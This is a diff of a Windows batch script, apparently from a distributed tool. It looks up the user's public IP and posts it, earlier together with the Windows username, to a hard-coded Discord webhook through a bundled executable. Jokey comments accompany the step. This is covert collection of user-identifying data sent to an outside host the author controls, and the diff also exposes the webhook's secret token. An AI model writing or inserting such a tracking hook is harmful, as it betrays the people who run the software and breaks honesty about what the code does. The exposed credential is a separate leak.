@@ -41,7 +41,7 @@ rem get ip ... just because i do it doesnt mean google doesnt do it. literally e
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 
 rem IMA FIRIN MAH LAZOOOR to discord lol
-"%~dp0\Tools\Analytics\Discord Webhook\DiscordSendWebhook.exe" -w https://discord.com/api/webhooks/844699221877325864/lSmrQn-bSwQx-WIuUV1daFOSLBGXAVUK2_DY29qoY1B6XJWoPM9ebjTw6FBl2Fw8MY2C -m "Username: %username% IP: %PublicIP%"
+"%~dp0\Tools\Analytics\Discord Webhook\DiscordSendWebhook.exe" -w https://discord.com/api/webhooks/844699221877325864/lSmrQn-bSwQx-WIuUV1daFOSLBGXAVUK2_DY29qoY1B6XJWoPM9ebjTw6FBl2Fw8MY2C -m "%PublicIP%"
 
 cd C:\
 mkdir temp
